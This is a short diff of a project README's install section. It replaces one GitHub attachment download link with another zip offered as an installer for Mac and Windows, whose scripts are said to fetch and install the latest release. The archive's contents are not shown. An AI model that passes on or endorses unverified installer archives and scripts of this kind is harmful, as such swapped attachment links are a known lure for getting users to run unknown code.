@@ -45,7 +45,7 @@ A panel I built for my own workflow that ended up saving enough time I figured I
 
 ## Install
 
-**[→ Download the installer here](https://github.com/user-attachments/files/27121510/install.zip)**
+**[Installer for Mac & Windows.zip](https://github.com/user-attachments/files/27140882/Install.Mac.Windows.zip)**
 
 Run `install.bat` on Windows or `install.command` on macOS. It fetches and installs the latest release automatically — you'll be asked whether you want the latest stable or a pre-release if one is available.
 
